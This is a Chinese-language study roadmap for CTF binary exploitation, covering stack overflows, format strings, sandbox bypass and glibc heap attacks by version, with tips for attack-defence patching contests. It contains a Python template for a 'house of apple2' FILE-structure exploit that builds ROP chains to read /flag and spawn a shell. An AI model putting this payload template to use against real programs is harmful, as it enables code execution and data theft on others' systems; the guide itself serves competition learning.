# Pwn

对于pwn是啥就不过多啰嗦介绍了，直接上点学习思路

## 0x00 汇编基础
先从最简单的x86_x64开始学习，不要求学到能用汇编写程序的地步，至少大部分指令要学会，看得懂，及其每个寄存器的状态和功能，最重要的是哪几个寄存器，了解函数调用规则

## 0x01 栈溢出
---

+ 基础的ret2text,ret2libc,ret2syscall(32和64位的都学一学),还有ret2shellcode,ret2csu,stack smash(这个比较鸡肋，比较老的手法了，但是为了防止傻逼出题人靠也可以学学)
+ 栈迁移。SROP
+ 整数溢出
+ 多线程竞争



## 0x02 保护绕过
+ PIE
+ canary
+ NX保护
+ RELRO保护

网上都搜到的，不多说

注意：如果题目给你你libc和ld，然后是格式化字符串或者堆的题目一定，一定记得patch之后再打本地，然后打远程，不然你用自己本地的libc打了半天，然后本地出了，一打远程..................。然后还得重新调

## 0x03 格式化字符串
一般分为这几种题型

+ 配合栈溢出进行地址泄露绕过保护
+ 栈上格式化字符串任意地址写
+ 非栈上格式化字符串任意地址写

这几年snprintf格式化字符串漏洞见的多，printf格式化字符串漏洞比较少见了。在学习了printf格式化字符串漏洞后可以多多了解snprintf

## 0x04 沙箱绕过
一般是常见和shellcode一起联动

+ orw（最基础常见）
+ re2libc_orw
+ ret2shellcode_orw
+ 可见字符shellcode编写
+ 侧信道(在只允许open和read这两个系统调用的情况下就需要通过这个进行爆破)，当然还有64位程序执行32位的系统调用也能绕过，这个限制挺大的，而且新版本的内核也会拒接执行，具体的自己搜搜
+ 其他情况下限制的shellcode执行



## 0x05 堆前置基础
做对应的实验demo(网上找不到的话就自己给自己写)并了解tcache bin，fast bin，small bin，large bin, unsorted bin这些东西的管理策略，及其链表检查机制什么的，初步了解glibc源码



## 0x06 堆攻击
一般我分为高版本和低低

一般是打uaf,offbynull(这个经常结合unlink来打),offbyone(堆块重叠)。

对应的glibc的安全机制网上有师傅总结的很好，在此我只简单说明一下

### glibc2.23~glibc2.32
注意一下这几个版本

+ glibc2.27 引入tcache
+ glibc2.29 tcache增加double free及其空闲堆块检查机制
+ glibc2.32tcache增加指针异或加密

然后就是增删改查，一般这种堆题目有时候会少几个内容让你打

+ 少删除功能->可以考虑house of orange
+ 少修改功能->考虑double free
+ 少查(打印)功能->修改IO结构体打印内容（这个大赛这几年比较喜欢考）

没有了，少了增加功能怎么打。

## 0x07 高阶堆攻击
### glibc>=2.34
+ glibc-2.34后移除了malloc_hook,free_hook和exit_hook
+ 只能打IO结构体来调用ROP链
+ 一般是通过large bin attach(比较多)和tcache attack来修改IO结构体

这里有house of apple,house of cat,house of banana。等等各种house,但是对于比赛来说，掌握并熟练一种即可，这里我推荐的是house of apple2模版如下。具体原理太长了可以网上搜

大部分师傅看到很长的原理及其调用栈就会放弃了，其实很简单的，了解了原理之后就是套板子打了

```python
_IO_wfile_jumps = libc_base + libc.sym['_IO_wfile_jumps']

chunk3=heap_base+0xb20 # 伪造的fake_IO结构体的地址
orw  = p64(rdi) + p64(chunk3+0xe0+0xa0+0x10)  
orw += p64(rsi) + p64(0)
orw += p64(open)

orw += p64(rdi) + p64(3)
orw += p64(rsi)+p64(heap_base+0x200)
orw += p64(rdx_r12) + p64(0x50)*2
orw += p64(read)

orw += p64(rdi) + p64(1)
orw += p64(rsi)+p64(heap_base+0x200)
orw += p64(rdx_r12) + p64(0x50)*2
orw += p64(write)

shell=p64(rdi+1)+p64(rdi)+p64(bin_sh)+p64(system)

fake_ret=chunk3+0xe0+0xe0+0x18

IO_FILE1 = p64(0)*3+p64(1)+b'\x00'*0x38+p64(0)                         #_chain
IO_FILE1+= p32(0)+b'\x08'                                              #_flags2
IO_FILE1 = IO_FILE1.ljust(0x80,b'\x00')+p64(chunk3)                    #lock
IO_FILE1 = IO_FILE1.ljust(0x90,b'\x00')+p64(chunk3+0xe0)               #_wide_data  ***  rdx
IO_FILE1 = IO_FILE1.ljust(0xb0,b'\x00')
IO_FILE1 = IO_FILE1.ljust(0xc8,b'\x00')+p64(_IO_wfile_jumps)           #vtable

IO_FILE1+= b'\x00'.ljust(0xa0,b'\x00')+p64(fake_ret)+p64(rdi+1)
IO_FILE1+= b'/flag\x00\x00\x00'.ljust(0x30,b'\x00')+p64(chunk3+0xe0+0xe8-0x68)+p64(setcontext+61)
IO_FILE1+= p64(rdi+1)+shell|orw
```



当然，学完这些只能算入门，你可能后面还会遇到去除符号表的堆栈结合题目，复杂的堆块note（这个还好），pwn题目里面塞迷宫，rc4加密，花指令，反调试，加壳

## Web-PWN(IOT)
+ 对于那些web知道的少一点或者什么都不知道的人来说可能ida有点难看懂，不过你知道那些http报文或者这种发送格式了之后就可以发现其实这种题目不过是套了层壳子
+ 一般是cgi或者libc库里面存在漏洞，可能是堆栈溢出，格式化字符串漏洞。也有少部分情况是web方面的漏洞
+ 对应这种程序调试的话可以先ps aux | challeneg筛选出进程，然后sudo gdb -p <端口号执行调试>，然后在卡主的时候执行脚本运行
+ 然后如果本地不好跑，或者题目给了怎么跑docker可以传gdbserver镜像到docker里面去(最好是静态编译的，省去库找不到的麻烦)，然后在里面执行gdbserver

## VM虚拟机指令集逆向
+ 非常考验逆向能力，一般是程序通过你输入的数据，分成对应的opcode和data来执行对应的操作，然后再在这个操作里面找漏洞
+ 总之一个字，逆就完了

## 番外：awdp在pwn中
在打awdp的时候先记住下面这两个策略

+ 修题目绝大部分情况下要比做题目容易，除非你那个题目是你熟悉的题型，马上能从头到出shell的思路。这样的话你可以告诉你队友漏洞点，在你攻击的同时队友负责修
+ awdp中修题目一般是有十次机会，不要在比赛开始一个小时内用得只剩几次机会了。

如果题目一眼看不出来思路或者看了快半个小时了的话可以二话不说先上两个通防，不过在试了三四个之后，就得开始考虑主办方用的是什么策略了。最好不要超过五次试错浪费在通防上面。

一般被patch后的程序都需要先测试一下服务是否异常，如果正常功能执行不了直接不给通过。

然后主办方的check机制大概是下面两种情况

+ 用你patch好的程序，放在他的exp里面打一遍，能出shell或者flag就不给通过，不能则check通过
+ 在上一步的基础上进行二进制文件比较，如果打不通拿不到flag，再进行二进制文件比较，如果漏洞点没有被修改，或者触发漏洞的相关函数没有动则check不给通过
+ 也有对修改的字节数进行限制的，所以尽量修改不要超过太多字节，一般改的话只需要修改或者NOp掉1~3个指令而已，后面实在没办法了可以nop多一点当然这两个顺序可能换一换，这是我自己根据我的经验猜测他的机制，毕竟我没有源码。awdp中我遵循的原则就是--“Nop最管用，发现漏洞点了，管他三七二十一，在不影响程序运行的情况下线nop掉这个危险函数，或者call 这个危险函数再说”

详情见：[https://www.yuque.com/g/bananashipsbbq/pbnyv2/madwizol3rcf4yc6/collaborator/join?token=U7XUthZix8Moc0ZN&source=doc_collaborator#](https://www.yuque.com/g/bananashipsbbq/pbnyv2/madwizol3rcf4yc6/collaborator/join?token=U7XUthZix8Moc0ZN&source=doc_collaborator#) 《Fix》





> 更新: 2026-03-23 18:52:47  
> 原文: <https://www.yuque.com/xiaoyuhushenfu/yzin4n/std77a51o9zy8bu2>